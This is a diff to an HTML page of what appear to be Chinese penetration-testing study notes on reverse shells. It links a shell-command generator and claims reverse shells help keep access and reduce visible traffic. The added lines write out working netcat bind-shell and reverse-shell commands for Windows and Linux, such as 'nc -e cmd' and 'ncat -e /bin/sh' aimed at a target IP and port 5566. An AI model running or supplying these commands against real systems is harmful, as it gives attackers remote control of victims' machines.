@@ -186,9 +186,15 @@
 <li>反弹Shell命令</li>
 </ul>
 <ol>
-<li>命令生成：<a target="_blank" rel="noopener" href="https://forum.ywhack.com/shell.php">https://forum.ywhack.com/shell.php</a></li>
-<li>优势：<br>1、解决数据回显，eg：我们输入添加用户（useradd znskiw）的命令，能看到对方回复请输入用户名的命令（enter new user：）<br>2、解决数据通讯（维持权限）<br>3、如果没有反弹shell，请求一次对方就会出现一次流量。反弹shell后对方不会出现流量</li>
-<li>正向连接：我们主动去连接目标<br>反向连接：目标主动来连接我们</li>
+<li><p>命令生成：<a target="_blank" rel="noopener" href="https://forum.ywhack.com/shell.php">https://forum.ywhack.com/shell.php</a></p>
+</li>
+<li><p>优势：<br>1、解决数据回显，eg：我们输入添加用户（useradd znskiw）的命令，能看到对方回复请输入用户名的命令（enter new user：）<br>2、解决数据通讯（维持权限）<br>3、如果没有反弹shell，请求一次对方就会出现一次流量。反弹shell后对方不会出现流量</p>
+</li>
+<li><p><strong>正向连接</strong>：我们主动去连接目标<br>Linux控制Windows<br>&#x2F;&#x2F;绑定CMD到本地5566端口<br>windows：<code>nc -e cmd -lvp 5566</code><br>&#x2F;&#x2F;主动连接目标5566<br>linux：<code>ncat window的ip 5566</code></p>
+<p>Windows控制Linux<br>&#x2F;&#x2F;绑定SH到本地5566端口<br>linux:<code>ncat -e /bin/sh -lvp 5566</code><br>&#x2F;&#x2F;主动连接目标5566<br>window:<code>nc linux的ip 5566</code></p>
+<p><strong>反向连接</strong>：目标主动来连接我们<br>Linux控制Windows<br>&#x2F;&#x2F;等待5566连接<br>linux:<code>ncat -lvvp 5566</code><br>&#x2F;&#x2F;绑定CMD到目标5566端口<br>window:<code>nc -e cmd linux的ip 5566</code></p>
+<p>Windows控制Linux<br>&#x2F;&#x2F;等待5566连接<br>winodws:<code>nc -lvvp 5566</code><br>&#x2F;&#x2F;绑定CMD到目标5566端口<br>linux:<code>ncat -e /bin/sh windows的ip 5566</code></p>
+</li>
 </ol>
 
                 </section>
